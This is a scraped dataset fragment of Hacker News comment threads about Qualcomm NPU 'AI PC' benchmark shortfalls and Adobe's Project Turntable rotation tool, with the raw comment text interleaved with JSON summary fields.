acdha 18 hours agoparentprevIt’s more complicated than that (you’re assuming that the bigger CPU is optimized for the same workload) but it’s also irrelevant to the topic at hand: they’re seeing this NPU within a factor of 2-4 of the CPU, but if it performed half as well as Qualcomm claims it would be an order of magnitude faster. The story here isn’t another round of the specialized versus general debate but that they fell so far short of their marketing claims. reply p1necone 19 hours agoprevI might be overly cynical but I just assumed that the entire purpose of \"AI PCs\" was marketing - of course they don't actually achieve much. Any real hardware that's supposedly for the \"AI\" features will actually be just special purpose hardware for literally anything the sales department can lump under that category. reply bsmartt 1 hour agoprevYou dont seriously think MSFT expects this shit to benefit consumers do you? Their datacenters are overheating and the billing meter is still ticking while they burn, they need to figure out how to get consumers to start paying for this shit before they go broke and wall st sells them off for parts.. Either way, these are some of the first personal computers to have NPUs. They will improve. CPUs are 20 years optimized, this is literally the first try for some of these companies reply bsmartt 1 hour agoparentif anything this is a very promising benchmark for the new tech,. we're getting close. so what this means if NPUs are anywhere close to CPUs in the benchmarks is that NPUs are going to blow past CPUs very soon, because CPUs dont have much more weight to shed whereas NPUs are just getting started. reply fschutze 11 hours agoprevIs there a possibility to use the Qualcomm SNPE SDK? I thought this SDK isn't bad. Also, for those who have access to the Qualcomm NPU: Is the Hexagon SDK working properly? Do apps still need to be signed (which i never got to work) when using Hexagon? reply jamesy0ung 22 hours agoprevWhat exactly does Windows do with a NPU? I don't own an 'AI PC' but it seems like the NPUs are slow and can't run much. I know Apple's Neural Engine is used to power Face ID and the facial recognition stuff in Photos, among other things. reply dagaci 20 hours agoparentIts used for improving video calls, special effects, image editing/ effects and noise cancelling, teams stuff reply DrillShopper 21 hours agoparentprevIt supports Microsoft's Recall (now required) spyware reply Janicc 21 hours agorootparentPlease remind me again how Recall sends data to Microsoft. I must've missed that part. Or are you against the print screen button too? I heard that takes images too. Very scary. reply cmeacham98 20 hours agorootparentWhile calling it spyware like GP is over-exaggeration to a ridiculous level, comparing Recall to Print Screen is also inaccurate: Print Screen takes images on demand, Recall does so effectively at random. This means Recall could inadvertently screenshot and store information you didn't intend to keep a record of (To give an extreme example: Imagine an abuser uses Recall to discover their spouse browsing online domestic violence resources). reply bloated5048 20 hours agorootparentprevIt's always safe to assume it does if it's closed source. I rather be suspicious of big corporations seeking to profit at every step than naive. Also, it's security risk which already been exploited. Sure, MS fixed it, but can you be certain it won't be exploited some time in the future again? reply Terr_ 20 hours agorootparentprev> Please remind me again how Recall sends data to Microsoft. I must've missed that part. Sure, just post the source code and I'll point out where it does so, I somehow misplaced my copy. /s The core problem here is trust, and over the last several years Microsoft has burned a hell of a lot of theirs with power-users of Windows. Even their most strident public promises of Recall being \"opt-in\" and \"on-device only\" will--paradoxically--only be kept as long as enough people remain suspicious. Glance away and MS go back to their old games, pushing a mandatory \"security update\" which reset or entirely-removes your privacy settings and adding new \"telemetry\" streams which you cannot inspect. reply downrightmike 20 hours agoparentprevAI PC is just a marketing term, doesn't have any real substance reply acdha 18 hours agorootparentYea, we know that. I believe that’s why the person you’re replying too was asking for examples of real usage. reply woadwarrior01 11 hours agoprevIMO, benchmarking accelerator hardware with onnxruntime is like benchmarking a CPU with a Python script. > We've seen similar performance results to those shown here using the Qualcomm QNN SDK directly. Why not include those results? reply NoPicklez 18 hours agoprevFairly misleading title, boiling down AI PCs to just the Microsoft Surface running Qualcomm reply irusensei 9 hours agoprevAre NPUs the VLIW of our times in terms of hype? reply wyldfire 4 hours agoparentIt's interesting that you bring that up. VLIW isn't hype in this case, it's the actual architecture of the Hexagon ISA used in these PCs. As to whether AI PCs revolutionize our lives - well, that certainly might be hype. reply lostmsu 21 hours agoprevThe author's benchmark sucks if he could only get 2 tops from a laptop 4080. The thing should be doing somewhere around 80 tops. Given that you should take his NPU results with a truckload of salt. reply stanleykm 17 hours agoprevthe ARM SME could be an interesting alternative to NPUs in the future. Unlike the NPUs which have at best some fixed function API it will be possible to program the SMEs more directly reply Mistletoe 20 hours agoprev>The second conclusion is that the measured performance of 573 billion operations per second is only 1.3% of the 45 trillion ops/s that the marketing material promises. It just gets so hard to take this industry seriously. reply dmitrygr 22 hours agoprevIn general MAC unit utilization tends to be low for transformers, but 1.3% seems pretty bad. I wonder if they fucked up the memory interface for the NPU. All the MACs in the world are useless if you cannot feed them. reply Hizonner 22 hours agoparentIt's a tablet. It probably has like one DDR channel. It's not so much that they \"fucked it up\" as that they knowingly built a grossly unbalanced system so they could report a pointless number. reply dmitrygr 22 hours agorootparentWell, no. If the CPU can hit better numbers on the same model then the bandwidth from the DDR IS there. Probably the NPU does not attach to the proper cache level, or just has a very thin pipe to it reply Hizonner 22 hours agorootparentThe CPU is only about twice as good as the NPU, though (four times as good on one test). The NPU is being advertised as capable of 45 trillion operations per second, and he's getting 1.3 percent of that. So, OK, yeah, I concede that the NPU may have even worse access to memory than the CPU, but the bottom line is that neither one of them has anything close to what it needs to to actually delivering anything like the marketing headline performance number on any realistic workload. I bet a lot of people have bought those things after seeing \"45 TOPS\", thinking that they'd be able to usefully run transformers the size of main memory, and that's not happening on CPU or NPU. reply dmitrygr 22 hours agorootparentYup, sad all round. We are in agreement. reply moffkalast 22 hours agoparentprevI recall looking over the Ryzen AI architecture and the NPU is just plugged into PCIe and thus gets completely crap memory bandwidth. I would expect it might be similar here. reply PaulHoule 22 hours agorootparentI spent a lot of time with a business partner and an expert looking at the design space for accelerators and it was made very clear to me that the memory interface puts a hard limit on what you can do and that it is difficult to make the most of. Particularly if a half-baked product is being rushed out because of FOMO you’d practically expect them to ship something that gives a few percent of the performance because the memory interface doesn’t really work, it happens to the best of them: https://en.wikipedia.org/wiki/Cell_(processor) reply wtallis 21 hours agorootparentprevIt's unlikely to be literally connected over PCIe when it's on the same chip. It just looks like it's connected over PCIe because that's how you make peripherals discoverable to the OS. The integrated GPU also appears to be connected over PCIe, but obviously has access to far more memory bandwidth. reply ein0p 15 hours agoprevMemory bound workload is memory bound. Doesn’t matter how many TOPS you have if you’re sitting idle waiting on DRAM during generation. You will, however notice a difference in prefill for long prompts. reply downrightmike 20 hours agoprevThey should have just made a pci card and not tried to push whole new machines on us. We are all good with the machines we already have. If you want to sell a new feature, then it needs to be an add-on reply pram 22 hours agoprevI laughed when I saw that the Qualcomm “AI PC” is described as this in the ComfyUI docs: \"Avoid\", \"Nothing works\", \"Worthless for any AI use\" reply LikelyABurner 8 hours agoparentDidn't believe that anyone would be bridge-burning-happy enough to put this in their official docs, but you're not kidding: https://github.com/comfyanonymous/ComfyUI/wiki/Which-GPU-sho... In retrospect, the fact that Intel and AMD's stock prices both closed slightly up when Microsoft announced the Snapdragon X on Windows 11 was a dead giveaway that the major players knew behind the scenes that it was being released seriously under baked. reply tromp 22 hours agoprev> the 45 trillion operations per second that’s listed in the specs Such a spec should be ideally be accompanied by code demonstrating or approximating the claimed performance. I can't imagine a sports car advertising a 0-100km/h spec of 2.0 seconds where a user is unable to get below 5 seconds. reply tedunangst 20 hours agoparentI have some bad news for you regarding how car acceleration is measured. reply otterley 18 hours agorootparentWell, what is it? reply ukuina 16 hours agorootparentEverything from rolling starts to perfect road conditions and specific tires, I suppose. reply dmitrygr 22 hours agoparentprevmost likely multiplying the same 128x128 matrix from cache to cache. That gets you perfect MAC utilization with no need to hit memory. Gets you a big number that is not directly a lie - that perf IS attainable, on a useless synthetic benchmark reply kmeisthax 22 hours agorootparentSounds great for RNNs! /s reply hkgjjgjfjfjfjf 20 hours agoprev [–] Sutherland's wheel of reincarnation turns. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Benchmarking Qualcomm's Neural Processing Unit (NPU) on a Microsoft Surface Tablet revealed a performance of only 1.3% of the advertised 45 Teraops/s, achieving just 573 billion operations per second.",
      "The tests, which included matrix multiplications akin to those in transformer models, showed the NPU performing slower than the CPU, despite using tools like Python, Cmake, and Visual Studio.",
      "Various factors such as power settings, model topology, and configuration errors were considered, indicating the NPU's performance is significantly below its marketed potential."
    ],
    "commentSummary": [
      "AI PCs utilizing Qualcomm's Neural Processing Unit (NPU) are not meeting performance expectations, with CPUs often outperforming NPUs.",
      "The NPU is designed for energy efficiency rather than speed, leading to a minimal performance gap between CPU and GPU, indicating potential inefficiencies.",
      "The current implementation of NPUs may not be fully optimized, emphasizing the need for improved support and optimization to harness their intended power-saving benefits."
    ],
    "points": 460,
    "commentCount": 264,
    "retryCount": 0,
    "time": 1729107842
  },
  {
    "id": 41870040,
    "title": "Adobe's new image rotation tool is one of the most impressive AI tools seen",
    "originLink": "https://www.creativebloq.com/design/adobes-new-image-rotation-tool-is-one-of-the-most-impressive-ai-concepts-weve-seen",
    "originBody": "Design Adobe's new image rotation tool is one of the most impressive AI concepts we've seen News By Daniel John published 2 days ago 'Project Turnable' lets users fully rotate 2D vectors. When you purchase through links on our site, we may earn an affiliate commission. Here’s how it works. (Image credit: Adobe) While Adobe's annual MAX conference gives the company a chance to unveil its latest features, it also lets the brand demonstrate some of its more weird and wonderful ideas. 'Sneaks' sees Adobe engineers take to the stage to share ideas that may or may not see the light of day, such as 2024's Project Turntable. Creative Bloq enjoyed an exclusive preview of the concept in ahead of its unveiling at MAX, and it's one of the most impressive Sneaks we've seen. Project Turntable lets users easily rotate 2D vector art in 3D, whilst ensuring it still look like 2D art from any new angle. And even after the rotation, the vector graphics stay true to the original shape, maintaining the design’s original essence. In the example above, a 2D vector of an illustrated warrior is rotated to face a dragon. While spinning, the vector image appears to be a 3D object, but the static image the user settles on will be completely flat. Truly impressive is how the tool uses AI to fill in the 'gaps' in the image – in another example, a 2D horse with only two visibly legs is rotated to reveal four. The tool was created by Adobe research scientist Zhiqin Chen. Adobe's Brian Domingo told Creative Bloq that like other Adobe Innovation project, there's still no guarantee that this feature will be released commercially – but the team expects it to generate a ton of interest at Adobe Max. From Automatic Image Distraction Removal, and a new Generative Workspace, Adobe has already announced over 100 new creator-first features this week. And with huge announcements from other brands including Tesla and Meta, this has arguably been one of the biggest weeks for AI we've seen so far. Get the Creative Bloq Newsletter Daily design news, reviews, how-tos and more, as picked by the editors. Contact me with news and offers from other Future brands Receive email from us on behalf of our trusted partners or sponsors By submitting your information you agree to the Terms & Conditions and Privacy Policy and are aged 16 or over. Daniel John Design Editor Daniel John is Design Editor at Creative Bloq. He reports on the worlds of art, design, branding and lifestyle tech (which often translates to tech made by Apple). He joined in 2020 after working in copywriting and digital marketing with brands including ITV, NBC, Channel 4 and more. TOPICS Graphic Design Adobe creative cloud 3D RELATED ARTICLES 'iPad babies' deserve to experience retro art toys ‘Nothing like this has been done before for Bond’: Behind the design of the stunning new James Bond book covers Every Adobe Sneak I saw at Adobe MAX 2024 This might just be the biggest week yet for AI LATEST ARTICLES 1 'iPad babies' deserve to experience retro art toys 2 ‘Nothing like this has been done before for Bond’: Behind the design of the stunning new James Bond book covers 3 Every Adobe Sneak I saw at Adobe MAX 2024 4 Two of our favourite phones have massive offers on right now 5 Apple's new iPad mini is more exciting than it looks",
    "commentLink": "https://news.ycombinator.com/item?id=41870040",
    "commentBody": "Adobe's new image rotation tool is one of the most impressive AI tools seen (creativebloq.com)439 points by ralusek 4 hours agohidepastfavorite163 comments ryandrake 4 hours agoI'm making some big assumptions about Adobe's product ideation process, but: This seems like the \"right\" way to approach developing AI products: Find a user need that can't easily be solved with traditional methods and algorithms, decide that AI is appropriate for that thing, and then build an AI system to solve it. Rather than what many BigTech companies are currently doing: \"Wall Street says we need to 'Use AI Somehow'. Let's invest in AI and Find Things To Do with AI. Later, we'll worry about somehow matching these things with user needs.\" reply dmurray 1 hour agoparentI would interpret it that they're getting the same push from Wall Street and the same investor-hype-driven product leadership as every other tech firm, but this time they have the good fortune to specialize in one of the few verticals (image editing) where generative AI currently has superhuman performance. This is a testable claim: where were Adobe in previous hype cycles? Googles \"Adobe Blockchain\"...looks like they were all about blockchains in 2018 [0], then NFTs and \"more sustainable blockchains\" in 2022 [1]. [0] https://blog.adobe.com/en/publish/2018/09/27/blockchain-and-... [1] https://www.ledgerinsights.com/adobe-moves-to-sustainable-bl... reply emmanueloga_ 3 hours agoparentprevI think you're being a bit too generous with Adobe here :-). I shared this before, but it's worth resharing [1]. It covers the experience of a professional artist using Adobe tools. The gist is that once a company has a captive audience with no alternatives, investors come first. Flashy (no pun intended :-p), cool features to impress investors become more important than the everyday user experience—and this feature does look super cool! -- 1: https://www.youtube.com/watch?v=lthVYUB8JLs reply latexr 2 hours agorootparentI don’t think those ideas are mutually exclusive. I heavily dislike Adobe and think they’re a rotten company with predatory practices. I also think “AI art” can be harmful to artists and more often than not produces uninteresting flawed garbage at an unacceptable energy cost. Still, when I first heard of Adobe Firefly, my initial reaction was “smart business move, by exclusively using images they have the rights to”. Now seeing Turntable my reaction is “interesting tool which could be truly useful to many illustrators”. Adobe can be a bad and opportunistic company in general but still do genuinely interesting things. As much as they deserve the criticism, the way in which they’re using AI does seem to be thought out and meant to address real user needs while minimising harm to artists.¹ I see Apple’s approach with Apple Intelligence a bit in the same vein, starting with the user experience and working backwards to the technology, as it should be.² Worth noting that I fortunately have distanced myself from Adobe for many years now, so my view may be outdated. ¹ Which I don’t believe for a second is out of the goodness of their hearts, it just makes business sense. ² However, in that case the results seem to be subpar and I don’t think I’d use it even if I could. reply zerkten 1 hour agorootparentWhether they avail of it, or not, Adobe have the possibility of accessing feedback and iterating on it for a lot of core design markets. I have a similar view to yours, but there is a segment of the AI community who feel that they are disrupting Adobe as much as other companies. In most cases, these companies have access to the domain experience which will enable AI and it won't work the other way around. All of this is orthogonal to Adobe's business practices. You should expect them to operate the way they do given their market share and the limited number of alternatives. I personally have almost moved completely to Affinity products, but I expect that Adobe should be better placed to execute products and for Affinity to be playing catchup to some extent. reply qerti 1 hour agorootparentprevI think the keyboard can be harmful to scribes and results in uninteresting flawed garbage like we see on internet comment sections. Think of all the energy and time we could save if all written content was made by scribes trained to produce high quality literature. reply jrflowers 30 minutes agorootparent> I think the keyboard can be harmful to scribes I like this reasoning. If something is new then it must be the future of humanity. People scoffed at Concorde for being “wasteful” and “flawed” but look at the company today reply latexr 1 hour agorootparentprevYou’re focusing on an irrelevant part of the comment and making a straw man out of it. Your account has very little content so you may be unfamiliar with the HN guidelines, in which case I urge you to refer to them before proceeding. Discussion should assume good faith and responses should become more substantive, not less, as the conversation goes on. https://news.ycombinator.com/newsguidelines.html reply HappMacDonald 1 hour agorootparentprevWell of course it's harmful to artists. This \"turnable\" nonsense is stealing food right out of the mouths of illustrators who you could pay to rotate that vector graphic for you. Now if you'll excuse me, I have Jacquard Looms to rip apart before somebody designs an AI that can put me out of that job, too. reply latexr 1 hour agorootparentWhat’s the goal of your comment? You’re making a straw man argument which in no way relates to my point and ridicules the opinions of people not on this thread. That makes for uninteresting and needlessly divisive conversation. The HN guidelines rightfully urge us to make substantive comments that advance the discussion and avoid shallow dismissals. https://news.ycombinator.com/newsguidelines.html reply bee_rider 1 hour agorootparentI think they are actually agreeing with you. Just, in a somewhat unpleasant and sarcastic manner. They aren’t strawmanning your argument, right? They are strawmanning the argument against it. reply latexr 1 hour agorootparent> They aren’t strawmanning your argument, right? They are strawmanning the argument against it. Yes, that’s the impression I got out of it too. I disapprove either way. I’d sooner defend a good argument against my point than a bad argument in favour of it. I come to HN for reasoned, thoughtful, curious discussion. reply bee_rider 34 minutes agorootparentI think what has happened (and I’ve been hit by this in the past, it is very annoying) is: You included the bit in the beginning about being generally skeptical of AI art in some forms to signal that you are somebody with a nuanced opinion, who believes that the thing can be bad at times. Then, you go on to describe that this isn’t one of those times. Unfortunately, this gets you some comments that want to disagree with that less specific, initial aside. I’m not sure if people just read the first paragraph and respond entirely based on that, without realizing that it is not the main point of the rest of the post. Or if they just don’t want to give up the ground that you did in the beginning, at all, so they knowingly ignore the rest of the post. I don’t really know what to do about this sort of thing. It seems like… generally nice to be able to start a post with something that says basically: look I’ve thought about this and it isn’t an uninformed reflexive take. But I’m trying to give up on that sort of thing. It isn’t really logically part of the argument, and it ends with people arguing in a direction that I’m not really interested in defending against in this context. But it does seem a shame, because, while it isn’t logically part of the argument, it is nice to know beforehand how firm somebody’s stance is. reply metalliqaz 56 minutes agorootparentprevthat's three comments so far (now four) discussing if the comment in question adequately adds to the discussion. If you ask me, hyperbole and sarcasm have a place in nearly any exchange of ideas, but maybe I just haven't drank the right kool-aid for this space. I think another, perhaps more relevant reference could be the replacement of hand-painted cells with computer-generated frames for animation. It replaced one kind of artist with another. Nobody got all that worked up about it, in the long run. reply bee_rider 27 minutes agorootparentThere are plenty of sarcastic, hyperbolic, dismissive, etc comments on this site. I don’t think you need to gulp down the koolaid or anything. But the discussion is a little better if we take a little sip every now and then, perhaps even slightly performatively. The “ground-state” of big open Internet discussion sites like this is dismissive and cheap, so it is good to have active pushback occasionally. reply mesh 2 hours agorootparentprevYou can have both! Cool features that excite users (and that they ultimately end of using), and that get investors excited. (i.e. Adobe mentioned in the day 1 keynote that Generative Fill, released last year and powered by Adobe Firefly is not one of the top 5 used features in Photoshop). The features we make, and how we use gen ai is based on a lot of discussions and back and forth with the community (both public and private) I guess Adobe could make features that look cool, but no one wants to use, but that doesn't seem to really make any sense. (I work for Adobe) reply derefr 2 hours agorootparent> is not one of the top 5 used features in Photoshop I mean, is there any Photoshop feature that’s come to dominate people’s workflows so quickly? People (e.g. photographers) who use Photoshop “in anger” for professional use-cases, and who already know how to fix a flaw in an image region without generative fill, aren’t necessarily going to adopt it right out of the gate. They’re going to tinker with it a bit, but time-box that tinkering, otherwise sticking with what they can guarantee from experience will get a “satisfactory” result, even if it takes longer and might not have as high a ceiling for how perfectly the image is altered. And that’d just people who repair flaws in images. Which I’m guessing aren’t even the majority of Photoshop users. Is the clone brush even in the top 5 Photoshop features by usage? reply WillAdams 1 hour agorootparentprevMoreover, when one looks at the chronology with which features were rolled out, all the computationally hard things which would save sufficient time/effort that folks would be willing to pay for them (and which competitors were unlikely to be able to implement) were held back until Adobe rolled out its subscription pricing model --- then and only then did the _really_ good stuff start trickling out, at a pace to ensure that companies kept up their monthly payments. reply MiddleEndian 3 hours agoparentprevMy company has decided to update its hr page to use AI for reasons unknown. So instead of the old workflow: \"visit HR page\" → \"click link that for whatever reason doesn't give you a permanent link you can bookmark for later\" it's now: \"visit HR page\" → \"do AI search for the same link which is suggested as the first option\" → \"wait 10-60 seconds for it to finally return something\" → \"click link that for whatever reason doesn't give you a permanent link you can bookmark for later\" reply coliveira 2 hours agorootparentNvidia needs to continue selling chips like crazy, all companies in the US need to do their fair share to contribute!... reply Oarch 2 hours agorootparentBubbles require constant maintenance reply __alias 2 hours agorootparentprevMine has as well, but it's pretty useful. It's really just a search engine though, but it's indexed confluence and all other internal sites and i've found it pretty useful for everything. reply mstipetic 2 hours agorootparentprevSomebody's putting \"AI expert\" on their resume reply rightbyte 2 hours agorootparentprev\"click link that for whatever reason doesn't give you a permanent link you can bookmark for later\" Sounds like engagement hacking? reply Macha 2 hours agorootparentI think this is a weird SAML pattern I've seen before where e.g. Okta generates a URL that's like https://somevendor.com/SAML/somesignedbase64payload to do SSO, which is sort of the inverse of the more common approach of the page you're logging into sending you to the Auth provider after seeing your email domain. reply stonogo 2 hours agorootparentprevMy assumption would be clumsy session tracking. reply jthacker 3 hours agoparentprevThis is certainly a great immediately useful tool but also a relatively small ROI, both the return and the investment. Big tech is aiming for a much bigger return on a clearly bigger investment. That’s going to potentially look like a lot of useless stuff in the meantime. Also, if it wasn’t for big tech and big investments, there wouldn’t even be these tools / models at this level of sophistication for others to be using for applications like this one. reply HarHarVeryFunny 3 hours agorootparentWhile the press lumps it all together as \"AI\", you have to differentiate LLMs (driven by big tech and big money) from unrelated image/video types of generative models and approaches like diffusion, NeRF, Gaussian splatting, etc, which have their roots in academia. reply copperx 2 hours agorootparentLLMs don't have their roots in academia? reply withinboredom 2 hours agorootparentNot anymore. reply HarHarVeryFunny 2 hours agorootparentNot at all - Transformer was invented by a bunch of former Google employees (while at Google), primarily Jakob Uszkoreit and Noam Shazeer. Of course as with anything it builds on what had gone before, but it's really quite a novel architecture. reply ansk 26 minutes agorootparentThe scientific impact of the transformer paper is large, but in my opinion the novelty is vastly overstated. The primary novelty is adapting the (already existing) dot-product attention mechanism to be multi-headed. And frankly, the single-head -> multi-head evolution wasn't particularly novel -- it's the same trick the computer vision community applied to convolutions 5 years earlier, yielding the widely-adopted grouped convolution. The lasting contribution of the Transformer paper is really just ordering the existing architectural primitives (attention layers, feedforward layers, normalization, residuals) in a nice, reusable block. In my opinion, the most impactful contributions in the lineage of modern attention-based LLMs are the introduction of dot-product attention (Bahdanau et al, 2015) and the first attention-based sequence-to-sequence model (Graves, 2013). Both of these are from academic labs. As a side note, a similar phenomenon occurred with the Adam optimizer, where the ratio of public/scientific attribution to novelty is disproportionately large (the Adam optimizer is very minor modification of the RMSProp + momentum optimization algorithm presented in the same Graves, 2013 paper mentioned above) reply stavros 2 hours agorootparentprevThis makes no sense. A thing's roots don't change, either it did start there or it didn't. reply HarHarVeryFunny 1 hour agorootparentIt didn't. At least, the Transformer didn't. The abstract idea of a language model goes way back though within the field of linguistics, and people were building simplistic \"N-gram\" models before ever using neural nets, then using other types of neural net such as LSTMs and CNNs(!) before Google invented the Transformer (primarily with the goal of fully utilizing the parallelism available from GPUs - which couldn't be done with a recurrent model like LSTM). reply eitally 3 hours agorootparentprevOn the plus side, for Adobe, is that they have a fairly stable & predictable SaaS revenue stream so as long as their R&D and product hosting costs don't exceed their subscription base, they're ok. This is wildly different from -- for example -- the hyperscalers, who have to build and invest far in advance of a market [for new services especially]. reply renegade-otter 3 hours agoparentprevI don't think it's a Big Tech problem. Big Tech can come up with moronic ideas and be fine because they have unlimited cash. It's the smaller companies that need to count pennies who decide to flush the money down the AI Boondoggle Toilet. \"But Google does it. If we do it, we will be like Google\". reply reaperducer 3 hours agorootparent\"But Google does it. If we do it, we will be like Google\". Were you in my meeting about 40 minutes ago? Because that's almost exactly what was said. If the big tech companies wanted to be really evil, they could invent a nonsense tech that doesn't work, then watch as all the small upstart competitors bankrupt themselves to replicate it. reply coliveira 2 hours agorootparentIsn't this what AI is all about? Don't kid yourself, most companies, even some big ones, will bankrupt themselves chasing AI and the few remaining will get the spoils. reply AuryGlenz 1 hour agorootparentIt seems that’s just the way things go with disruptive technologies. It’s a gold rush and you don’t want to be left behind. reply sgerenser 55 minutes agorootparentprevWait, is that why we all have microservices now? reply renegade-otter 5 minutes agorootparentThat's exactly right. This appeared before on HN but that's what I wrote about a couple of years back: https://renegadeotter.com/2023/09/10/death-by-a-thousand-mic... reply oarsinsync 1 hour agorootparentprevSounds a bit like trying to roll and support your own k8s platform reply notarealllama 3 hours agorootparentprevYou mean like React, right? Right? reply mihaaly 3 hours agoparentprevIt is the 'make something for the user/client' vs. 'make something to sell' mindset. The latter one is what overwhelmingly more companies (not only BigTech, not at all!) adopted nowadays. And Boeing. ;) reply politelemon 3 hours agorootparentAnd Boeing? reply tiffanyh 2 hours agoparentprevFocusing on solving customer problems, not buzz words, typically is the right path. reply lofaszvanitt 1 hour agoparentprevYeah but sometimes, they just f it up. Like the PS crop tool was aok then they introduced the move the background instead of the crop rectangle way of cropping which is still to this day a terrible experience. Also, Lightroom is one of the worst camera tools out there. It's only known because ADOBE... reply ryanmcbride 4 hours agoparentprevYeah I much prefer this approach to the current standard of just putting a chat bot somewhere on the page and calling it a day. reply 2OEH8eoCRo0 16 minutes agoparentprevMore like \"ship some half baked bullshit wrapper for ChatGPT or llama and call it revolutionary.\" reply JohnMakin 3 hours agoparentprevPrecisely. There are many such use cases too! It's disappointing to see the industry go all in on chatbot wrappers. reply crazygringo 2 hours agoparentprevThis feels extremely ungenerous to the Big Tech companies. What's wrong with trying out 100 different AI features across your product suite, and then seeing which ones \"stick\"? You figure out the 10 that users find really valuable, another 10 that will be super-valuable with improvement, and eventually drop the other 80. Especially when if Microsoft tries something and Google doesn't, that suddenly gives Microsoft a huge lead in a particular product, and Google is left behind because they didn't experiment enough. Because you're right -- Google investors wouldn't like that, and would be totally justified. The fact is, it's often hard to tell which features users will find valuable in advance. And when being 6 or 12 months late to the party can be the difference between your product maintaining its competitive lead vs. going the way of WordPerfect or Lotus 123 -- then the smart, rational, strategic thing to do is to build as many features as possible around the technology, and then see what works. I would suggest that if Adobe is being slower with rolling out AI features, it might be more because of their extreme monopoly position in a lot of their products, thanks to the stickiness of their file formats. That they simply don't need to compete as much, which is bad. reply swatcoder 2 hours agorootparent> What's wrong with trying out 100 different AI features across your product suite, and then seeing which ones \"stick\"? For users? Almost everything is wrong with that. There are no users looking for wild churn in their user interface, no users crossing their fingers that the feature that stuck for them gets pruned because it didn't hit adoption targets overall, no users hoping for popups and nags interrupting their workflow to promote some new garbage that was rushed out and barely considered. Users want to know what their tool does, learn how to use it, and get back to their own business. They can welcome compelling new features, of course, but they generally want them to be introduced in a coherent way, they want to be able to rely on the feature being there for as long as their own use of those features persists, and they want to be able to step into and explore these new features on their own pace and without disturbance to their practiced workflow. reply crazygringo 2 hours agorootparentThink about the other side though -- if the tool you've learned and rely on goes out of business because they didn't innovate fast enough, it's a whole lot worse for you now that you have to learn an entirely new tool. And I haven't seen any \"wild churn\" at all -- like I said in another comment, a few informative popups and a magic wand icon in a toolbar? It's not exactly high on the list of disruptions. I can still continue to use my software the exact same way I have been -- it's not replacing workflows. But it's way worse if the product you rely on gets discontinued. reply bigstrat2003 10 minutes agorootparentNo, it's way worse if the product I rely on does as you suggest and keeps adding new features just to see what will stick. I hate that sort of behavior with a passion and it is the sort of thing which will make me never do business with a company again. reply swatcoder 2 hours agorootparentprevThe presence or absence of some subtle new magic wand icon that shows up in the toolbar is neither making nor breaking anyone's business. And even if it comes to be a compelling feature in my competitor's product, I've got plenty of time to update my product with something comparable. At least if I've done a good job building something useful for my customers in the first place. Generative ML technologies may dramatically change a lot of our products over time, but there's no great hole they're filling and there's basically no moat besides capital requirements that keeps competitors from catching up with each other as features prove themselves out. They just open a few new doors that people will gradually explore. Anxiously spamming features simply betrays a lack of confidence in one's own product as it stands, directly frustrates professional users, and soaks up tons capital that almost certainly has other places it could be going. reply crazygringo 1 hour agorootparent> The presence or absence of some subtle new magic wand icon that shows up in the toolbar is neither making nor breaking anyone's business. Sounds like famous last words to me. The corporate landscape is filled with the corpses of companies that thought they didn't need to rush to adapt to new technologies. That they'd have time to react if something really did take off in the end. Just think of how Kodak bided its time to see if newfangled digital photography would actually take off and when... and then it was too late. reply swatcoder 55 minutes agorootparentYou're comparing being 3 months behind on a supplementary software feature that's tucked among dozens of icons on the toolbar with making a hard decision about pivoting your entire megalithic industrial, research, sales, and distribution infrastructure to a radically new technology. The discussion you started is about spamming features to see what sticks, as set against making deliberate, selective product decisions as you confidently observe your market. It's possible that a company that ideologically sets itself against delivering any generative AI features ever might miss where the industry is going over the next 10 or 20 years. But we were never talking about that, were we? reply crazygringo 28 minutes agorootparentDigital photography started out as a supplementary toy as well. And we are starting to witness a gigantic computational infrastructure pivot with GPU's and NPU's and whatnot. Google and Amazon are literally signing nuclear power plant agreements to power it. AI is a radically new technology. Do you remember two years ago when ChatGPT came out, and people here on HN were confidently declaring it was the end of Google Search, unless Google proved they could respond immediately? And Google released Gemini less than six months later to demonstrate that Search wasn't going to go the way of Kodak, and it still took people a while to calm down after that? And the AI revolution is moving a lot faster than the digital photography revolution. We're not talking about \"the next 10 or 20 years\". You seem to be severely underestimating the power of competition and technological progress, and the ability for it to put you out of business. You're suggesting the correct approach is \"deliberate, selective product decisions as you confidently observe your market.\" What happens when your deliberation is too slow, your selectivity turns out to be wrong, and your confidence is ill-founded? Well, the company that was willing to experiment with a lot more features is more likely to build the winning features and take over the market while you were busy deliberating. I'm surprised to be having this conversation on HN, where the start-up ethos reigns supreme. The whole idea of the tech world is to try new things and fail fast, because it's better for everyone in the long run. That's what the big corporations are doing with AI features. Isn't that the kind of thing that tech entrepreneurs are supposed to celebrate? reply Arainach 2 hours agorootparentprevLLMs aren't profitable. There's no significant threat of a product getting discontinued because it didn't jump high enough over the AI shark. reply ryandrake 2 hours agorootparentprev> What's wrong with trying out 100 different AI features across your product suite, and then seeing which ones \"stick\"? Even the biggest tech companies have limited engineering bandwidth to allocate to projects. What's wrong with those 100 experiments is the opportunity cost: they suck all the oxygen out of the room and could be shifting the company's focus away from fixing real user problems. There are many other problems that don't require AI to solve, and companies are starving these problems in favor of AI experiments. It would be better to sort each potential project by ROI, or customer need, or profit, or some other meaningful metric, and do the highest ranked ones. Instead, we're sorting first by \"does it use AI\" and focusing on those. reply crazygringo 2 hours agorootparentWhat you describe, I don't see happening. If you look at all the recent Google Docs features rolled out, only a small minority are AI-related: https://workspaceupdates.googleblog.com/search/label/Google%... There are a few relating to Gemini in additional languages and supporting additional document types, but the vast majority is non-AI. Seems like the companies are presumably sorting on ROI just fine. But, of course, AI is expected to have a large return, so it's in there too. reply coliveira 2 hours agorootparentprevSo it's ok for all of us to become lab rats for these companies? reply crazygringo 2 hours agorootparentEvery consumer is a \"lab rat\" for every company at all times, if that's how you want to think about it. Each of our decisions to buy or not buy a product, to use or not use a feature, influences the future design of our products. And thank goodness, because that's the process by which products improve. It's capitalism at work. Mature technologies don't need as much experimentation because they're mature. But whenever you get new technologies, yes all these new applications battle each other out in the market in a kind of survival-of-the-fittest. If you want to call consumers \"lab rats\", I guess that's your choice. But the point is -- yes, it's not only OK -- it's something to be celebrated! reply blep-arsh 2 hours agorootparentprevForce-feeding 100s of different AI features (90% of which are useless at best) to users is what's wrong with the approach. reply crazygringo 2 hours agorootparentWhy? It's not \"force-feeding\". You usually get a little popup highlighting the new feature that you close and never see again. It's not that hard to ignore a new \"magic wand\" button in the toolbar or something. I personally hardly use any of the features, but neither do I feel \"force-fed\" in the slightest. Aside from the introductory popups (which are interesting), they don't 